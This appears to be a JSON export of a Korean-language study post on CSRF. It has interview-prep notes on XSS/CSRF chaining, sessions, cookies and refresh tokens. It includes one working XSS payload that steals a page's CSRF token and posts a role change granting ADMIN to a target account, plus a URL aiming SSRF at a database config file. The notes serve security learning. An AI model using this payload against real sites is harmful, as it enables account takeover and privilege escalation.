@@ -1,0 +1,174 @@
+{
+  "format": "yt010108-published-post",
+  "version": 1,
+  "id": "3e148b7f-e5d3-4645-9fbf-bfa8390c56d1",
+  "title": "CSRF",
+  "kind": "posts",
+  "slug": "CSRF",
+  "description": "",
+  "category": "",
+  "date": "2026-11-06",
+  "tags": [],
+  "status": "published",
+  "trashedAt": null,
+  "publishedAt": "2026-11-06T11:35:07.052Z",
+  "updatedAt": "2026-11-06T11:35:07.052Z",
+  "sourceDigest": "305c52c1be69c23df8d53e9b6dacb0a0c0325416179e57986fe03000844b0f57",
+  "assets": [
+    {
+      "id": "3f3c708f-4bda-49ae-842a-5efa47aa92bc",
+      "name": "image.png",
+      "type": "image/png",
+      "path": "/assets/uploads/3e148b7f-e5d3-4645-9fbf-bfa8390c56d1/3f3c708f-4bda-49ae-842a-5efa47aa92bc.png",
+      "sha": "3265fcdece0bc60ce557287313d26de7622da80d"
+    },
+    {
+      "id": "d84a11cc-e32d-4f8a-b4c0-29e9c48cc7ab",
+      "name": "image.png",
+      "type": "image/png",
+      "path": "/assets/uploads/3e148b7f-e5d3-4645-9fbf-bfa8390c56d1/d84a11cc-e32d-4f8a-b4c0-29e9c48cc7ab.png",
+      "sha": "a74e8fb7252832cd3913d6bf7b5839a02e950287"
+    }
+  ],
+  "doc": {
+    "type": "doc",
+    "content": [
+      {
+        "type": "image",
+        "attrs": {
+          "src": "/assets/uploads/3e148b7f-e5d3-4645-9fbf-bfa8390c56d1/3f3c708f-4bda-49ae-842a-5efa47aa92bc.png",
+          "alt": "image",
+          "title": null,
+          "width": null,
+          "height": null,
+          "assetId": "3f3c708f-4bda-49ae-842a-5efa47aa92bc"
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "면접에서 자주 물어봄"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "크사,csrf연계해"
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "src": "/assets/uploads/3e148b7f-e5d3-4645-9fbf-bfa8390c56d1/d84a11cc-e32d-4f8a-b4c0-29e9c48cc7ab.png",
+          "alt": "image",
+          "title": null,
+          "width": null,
+          "height": null,
+          "assetId": "d84a11cc-e32d-4f8a-b4c0-29e9c48cc7ab"
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "세션 쿠키 토큰 차이점 리프레시 토큰이 뭔지"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": " app이든 웹이든  편의성과 보안 중에 차이점"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "capcha무조"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "소스코드 분석 -> 소스폼-> 어떤 파라미터인지 어떻게 작동하는 지 "
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "<script>(async()=>{const h=await(await fetch('/csrfToken/update_role.jsp')).text();const t=new DOMParser().parseFromString(h,'text/html').querySelector('[name=\"csrfToken\"]').value;await fetch('/csrfToken/update_role_ok_csrfToken.jsp',{method:'POST',body:new URLSearchParams({target_id:'"
+          },
+          {
+            "type": "text",
+            "marks": [
+              {
+                "type": "link",
+                "attrs": {
+                  "href": "mailto:yt@asd.com",
+                  "target": "_blank",
+                  "rel": "noopener noreferrer",
+                  "class": null,
+                  "title": null
+                }
+              }
+            ],
+            "text": "yt@asd.com"
+          },
+          {
+            "type": "text",
+            "text": "',new_role:'ADMIN_csrfToken',csrfToken:t})})})()</script>"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "marks": [
+              {
+                "type": "link",
+                "attrs": {
+                  "href": "http://eqst-ssrf-victim.com\"에서",
+                  "target": "_blank",
+                  "rel": "noopener noreferrer",
+                  "class": null,
+                  "title": null
+                }
+              }
+            ],
+            "text": "http://eqst-ssrf-victim.com"
+          },
+          {
+            "type": "text",
+            "text": "/include/db_conf.php"
+          }
+        ]
+      }
+    ]
+  }
+}
